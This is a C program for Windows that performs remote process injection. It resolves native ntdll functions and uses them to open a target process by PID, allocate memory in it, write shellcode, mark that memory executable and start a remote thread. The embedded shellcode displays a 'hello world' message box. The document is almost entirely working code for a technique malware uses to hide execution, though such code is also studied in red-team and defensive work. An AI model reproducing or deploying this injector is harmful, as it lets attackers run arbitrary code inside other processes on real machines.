#include <windows.h>
#include "inj.h"
#include <stdio.h>
#include <ntstatus.h>
#include <ntdef.h>


void RemoteProcessInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
    HANDLE hProcess = { INVALID_HANDLE_VALUE };
    HANDLE hThread = NULL;
    HMODULE pNtdllModule = NULL;
    CLIENT_ID clID = { 0 };
    DWORD mPID = pid;
    OBJECT_ATTRIBUTES objAttrs;
    NTSTATUS status;
    PVOID remoteBase = 0;
    PULONG bytesWritten = 0;
    SIZE_T regionSize = 0;
    unsigned long oldProtection = 0;
    // get handle to ntdll module (dll is referred to as module)
    pNtdllModule = GetModuleHandleA("ntdll.dll");

    /*
        First we will resolve the requisite nt apis from the above module.
    */

    // NtOpenProcess - native win api to get handle to a process. Resovle it first in the ntdll module
    pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(pNtdllModule, "NtOpenProcess");
    if (myNtOpenProcess == NULL) {
        printf("[-] Failed to resolve NtOpenProcess\n");
        exit(-1);
    }

    // NtAllocateVirtualMemory - native win api to allocate memory inside a process. Resolve it in the ntdll module.
    pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(pNtdllModule, "NtAllocateVirtualMemory");
    if (myNtAllocateVirtualMemory == NULL) {
        printf("[-] Failed to resolve NtAllocateVirtualMemory\n");
        exit(-1);
    }

    // NtWriteVirtualMemory - native win api to write to memory region. Resolve it in the ntdll module.
    pNtWriteVirtualMemory myNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(pNtdllModule, "NtWriteVirtualMemory");
    if (myNtWriteVirtualMemory == NULL) {
        printf("[-] Failed to resolve NtWriteVirtualMemory\n");
        exit(-1);
    }

    // NtProtectVirtualMemory - native win api to change memory protection/permission. Resolve it in the ntdll module.
    pNtProtectVirtualMemory myNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(pNtdllModule, "NtProtectVirtualMemory");
    if (myNtAllocateVirtualMemory == NULL) {
        printf("[-] Failed to resolve NtProtectVirtualMemory\n");
        exit(-1);
    }

    // NtCreateThread - native win api to create thread in the injected process. Resolve it in the ntdll module.
    pNtCreateThreadEx myNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(pNtdllModule, "NtCreateThreadEx");
    if (myNtCreateThreadEx == NULL) {
        printf("[-] Failed to resolve NtCreateThread\n");
        exit(-1);
    }

    /* finished nt api resolutions */

    /*win nt process injection */
    InitializeObjectAttributes(&objAttrs, NULL, 0, NULL, NULL);
    clID.UniqueProcess = (PVOID) mPID;
    clID.UniqueThread = 0;

    // open handle to target process
    // upon success, status value for the below NT APIs are '0'
    status = myNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttrs, &clID);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to open process : %x\n", status);
        exit(-1);
    }

    // allocate memory in target process
    regionSize = payload_size;
    status = myNtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate memory in the injected process : %x\n", status);
        exit(-1);
    }

    // write to the target process. The last argument of this api can be NULL as well. Does not affect execution.
    status = myNtWriteVirtualMemory(hProcess, remoteBase, payload, payload_size, bytesWritten);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to write to the memory of the injected process : %x\n", status);
        exit(-1);
    }

    // change memory permission RW -> RX
    // note that the third argument is a pointer to PULONG. As such, &regionSize (PSIZE_T) has to be typecasted to PULONG.
    status = myNtProtectVirtualMemory(hProcess, &remoteBase, (PULONG)&regionSize, PAGE_EXECUTE_READ, &oldProtection);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to change the memory permission from RW to RX of the written payload : %x\n", status);
        exit(-1);
    }

    system("pause");

    // start remote thread
    status = myNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteBase, NULL, false, 0,0,0, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to start a new thread in the injected process : %x\n", status);
        exit(-1);
    }

    system("pause");
}


int main(int argc, char **argv) {
    int pid = 0;

    if (argc <2 || argc > 3){
        printf("usage: filename.exe <PID>\n");
        exit(-5);
    }
    pid = atoi(argv[1]);

    // shellcode
    // MessageBox "hello world"
    unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    SIZE_T payload_size = sizeof(payload);
    RemoteProcessInjection(payload, payload_size, pid);
    
    return 0;
}